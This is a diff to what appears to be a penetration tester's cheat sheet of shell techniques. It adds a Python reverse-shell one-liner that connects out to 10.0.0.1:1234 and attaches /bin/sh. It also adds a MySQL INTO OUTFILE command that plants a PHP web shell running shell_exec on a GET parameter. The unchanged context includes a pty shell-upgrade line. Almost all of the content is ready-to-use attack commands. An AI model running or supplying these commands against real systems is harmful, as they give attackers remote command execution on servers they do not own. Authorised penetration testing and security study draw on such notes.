@@ -6,10 +6,14 @@
 #Bash shells
 	1. /usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
 	
+	
 #Bind Shells
 
 
+
 #Reverse Shells
+	1. Python shell
+		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 #Reverse Shells using metasploit
 
@@ -40,4 +44,5 @@
 
 	1. Creating a file onto the remote server
 		mysql> select "baba" into outfile "/var/www/html/somepath/wp-content/uploads/test.txt";
+		mysql> select "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/somepath/shell.php"
     
